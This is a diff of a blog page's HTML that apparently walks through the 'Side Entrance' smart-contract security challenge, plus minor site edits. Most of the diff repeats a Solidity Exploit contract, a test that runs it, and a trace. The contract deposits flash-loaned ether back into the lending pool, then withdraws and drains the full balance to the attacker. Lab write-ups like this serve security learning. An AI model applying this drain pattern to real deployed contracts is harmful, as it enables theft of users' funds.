-</span></span><span style="display:flex;"><span>        pool.deposit{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner, <span style="color:#0ff;font-weight:bold">&#34;Not an owner&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = <span style="color:#fff;font-weight:bold">address</span>(pool).<span style="color:#fff;font-weight:bold">balance</span>;
-</span></span><span style="display:flex;"><span>        pool.flashLoan(poolBalance);
-</span></span><span style="display:flex;"><span>        pool.withdraw();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">payable</span>(owner).sendValue(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>).<span style="color:#fff;font-weight:bold">balance</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {}
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
-</span></span><span style="display:flex;"><span>    Exploit expl = <span style="color:#fff;font-weight:bold">new</span> Exploit(sideEntranceLenderPool);
-</span></span><span style="display:flex;"><span>    expl.run();
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    validation();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit</span> <span class="k">is</span> <span class="n">IFlashLoanEtherReceiver</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">Address</span> <span class="k">for</span> <span class="kt">address</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">SideEntranceLenderPool</span> <span class="k">private</span> <span class="n">pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">private</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">SideEntranceLenderPool</span> <span class="n">_pool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span> <span class="o">=</span> <span class="n">_pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">),</span> <span class="s">&#34;Sender is not a pool&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not an owner&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">poolBalance</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">pool</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="n">poolBalance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">owner</span><span class="p">).</span><span class="n">sendValue</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nf">testExploit</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT START **/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">attacker</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Exploit</span> <span class="n">expl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Exploit</span><span class="p">(</span><span class="n">sideEntranceLenderPool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expl</span><span class="p">.</span><span class="n">run</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/** EXPLOIT END **/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">validation</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>The forge&rsquo;s trace reflects what we&rsquo;ve seen on the diagram above:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>[304450] SideEntrance::testExploit()
-</span></span><span style="display:flex;"><span>  ├─ [0] VM::startPrank(Attacker: [0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7])
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  ├─ [225707] → new Exploit@<span style="color:#0ff;font-weight:bold">&#34;0x8ff7…c3ec&#34;</span>
-</span></span><span style="display:flex;"><span>  │   └─ ← <span style="color:#ff0;font-weight:bold">905</span> bytes of code
-</span></span><span style="display:flex;"><span>  ├─ [44491] Exploit::run()
-</span></span><span style="display:flex;"><span>  │   ├─ [37187] Side Entrance Lender Pool::flashLoan(1000000000000000000000)
-</span></span><span style="display:flex;"><span>  │   │   ├─ [29848] Exploit::execute{value: 1000000000000000000000}()
-</span></span><span style="display:flex;"><span>  │   │   │   ├─ [22410] Side Entrance Lender Pool::deposit{value: 1000000000000000000000}()
-</span></span><span style="display:flex;"><span>  │   │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   ├─ [5971] Side Entrance Lender Pool::withdraw()
-</span></span><span style="display:flex;"><span>  │   │   ├─ [55] Exploit::fallback{value: 1000000000000000000000}()
-</span></span><span style="display:flex;"><span>  │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   ├─ [0] Attacker::fallback{value: 1000000000000000000000}()
-</span></span><span style="display:flex;"><span>  │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>  │   └─ ← ()
-</span></span><span style="display:flex;"><span>  └─ ← ()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>304450<span class="o">]</span> SideEntrance::testExploit<span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>0<span class="o">]</span> VM::startPrank<span class="o">(</span>Attacker: <span class="o">[</span>0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7<span class="o">])</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>225707<span class="o">]</span> → new Exploit@<span class="s2">&#34;0x8ff7…c3ec&#34;</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="m">905</span> bytes of code
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>44491<span class="o">]</span> Exploit::run<span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>37187<span class="o">]</span> Side Entrance Lender Pool::flashLoan<span class="o">(</span>1000000000000000000000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  │   │   ├─ <span class="o">[</span>29848<span class="o">]</span> Exploit::execute<span class="o">{</span>value: 1000000000000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">  │   │   │   ├─ <span class="o">[</span>22410<span class="o">]</span> Side Entrance Lender Pool::deposit<span class="o">{</span>value: 1000000000000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">  │   │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>5971<span class="o">]</span> Side Entrance Lender Pool::withdraw<span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   │   ├─ <span class="o">[</span>55<span class="o">]</span> Exploit::fallback<span class="o">{</span>value: 1000000000000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">  │   │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   ├─ <span class="o">[</span>0<span class="o">]</span> Attacker::fallback<span class="o">{</span>value: 1000000000000000000000<span class="o">}()</span>
+</span></span><span class="line"><span class="cl">  │   │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  ├─ <span class="o">[</span>0<span class="o">]</span> VM::stopPrank<span class="o">()</span>
+</span></span><span class="line"><span class="cl">  │   └─ ← <span class="o">()</span>
+</span></span><span class="line"><span class="cl">  └─ ← <span class="o">()</span>
 </span></span></code></pre></div><h2 id="remediation">
   Remediation
   <a class="heading-link" href="#remediation">
@@ -578,7 +572,7 @@ The rewarder</a>!</p>
     
       1985 -
     
-    2025
+    2026
      Vasiliy Yorkin 
     
   </section>
@@ -600,6 +594,11 @@ The rewarder</a>!</p>
   
 
   
+  
+  
+  <script src="https://vyorkin.org/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="></script>
+  
+  
 
   
 
@@ -608,7 +607,7 @@ The rewarder</a>!</p>
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
       <script>
         var doNotTrack = false;
-        if ( false ) {
+        if ( true ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
